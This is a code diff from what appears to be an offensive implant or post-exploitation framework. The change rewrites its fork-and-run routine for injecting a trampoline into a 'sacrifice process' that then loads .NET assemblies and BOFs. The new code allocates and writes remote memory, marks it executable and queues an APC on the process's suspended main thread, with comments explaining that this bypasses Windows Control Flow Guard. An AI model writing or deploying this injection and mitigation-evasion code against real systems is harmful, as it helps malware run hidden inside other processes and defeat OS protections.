@@ -175,6 +175,7 @@ VOID fork_cleanup(PINSTANCE inst, FORK_CTX* ctx) {
 #define TRAMPOLINE_SIZE 22
 
 static BOOL fork_inject_trampoline(PINSTANCE inst, HANDLE hProcess,
+                                   HANDLE hThread,
                                    LPVOID remote_data, LPVOID remote_code)
 {
     BYTE tramp[TRAMPOLINE_SIZE];
@@ -187,10 +188,27 @@ static BOOL fork_inject_trampoline(PINSTANCE inst, HANDLE hProcess,
     // jmp rax
     tramp[20] = 0xFF; tramp[21] = 0xE0;
 
-    // inject_shellcode_into uses the build-time INJECTION_TECHNIQUE (CRT/APC/Section/Custom)
-    HANDLE hThread = inject_shellcode_into(inst, hProcess, tramp, TRAMPOLINE_SIZE, NULL);
-    if (!hThread) return FALSE;
-    gate_CloseHandle(inst, hThread);
+    // Allocate + write the trampoline into the sacrifice process
+    LPVOID remote_tramp = gate_VirtualAllocEx(inst, hProcess, NULL, TRAMPOLINE_SIZE,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remote_tramp) return FALSE;
+
+    SIZE_T written = 0;
+    gate_WriteProcessMemory(inst, hProcess, remote_tramp, tramp, TRAMPOLINE_SIZE, &written);
+
+    DWORD old_protect = 0;
+    gate_VirtualProtectEx(inst, hProcess, remote_tramp, TRAMPOLINE_SIZE,
+        PAGE_EXECUTE_READ, &old_protect);
+
+    // Use APC on the already-suspended main thread to bypass CFG.
+    // CreateRemoteThread / NtCreateThreadEx start addresses go through
+    // BaseThreadInitThunk which validates the target against the CFG bitmap.
+    // Anonymous memory is never in the bitmap → FAST_FAIL_GUARD_ICALL_CHECK_FAILURE.
+    // APC execution bypasses this check entirely: the kernel queues the APC
+    // and the thread resumes into it without a CFG dispatch.
+    inst->Win32.QueueUserAPC((PAPCFUNC)remote_tramp, hThread, 0);
+    gate_ResumeThread(inst, hThread);
+
     return TRUE;
 }
 
@@ -270,9 +288,9 @@ BOOL fork_run_assembly(PINSTANCE inst,
     gate_VirtualProtectEx(inst, ctx.hProcess, remote_code, CLR_BOOTSTRAP_SIZE,
         PAGE_EXECUTE_READ, &old_protect);
 
-    // Inject trampoline via the configured injection technique (CRT/APC/Section/Custom).
+    // Inject trampoline via APC on the suspended main thread (CFG-safe).
     // The trampoline sets RCX = remote_data, then jumps to the CLR bootstrap.
-    if (!fork_inject_trampoline(inst, ctx.hProcess, remote_data, remote_code)) {
+    if (!fork_inject_trampoline(inst, ctx.hProcess, ctx.hThread, remote_data, remote_code)) {
         fork_cleanup(inst, &ctx);
         return FALSE;
     }
@@ -361,9 +379,9 @@ BOOL fork_run_bof(PINSTANCE inst,
     gate_VirtualProtectEx(inst, ctx.hProcess, remote_code, BOF_BOOTSTRAP_SIZE,
         PAGE_EXECUTE_READ, &old_protect);
 
-    // Inject trampoline via the configured injection technique (CRT/APC/Section/Custom).
+    // Inject trampoline via APC on the suspended main thread (CFG-safe).
     // The trampoline sets RCX = remote_data, then jumps to the BOF bootstrap.
-    if (!fork_inject_trampoline(inst, ctx.hProcess, remote_data, remote_code)) {
+    if (!fork_inject_trampoline(inst, ctx.hProcess, ctx.hThread, remote_data, remote_code)) {
         fork_cleanup(inst, &ctx);
         return FALSE;
     }
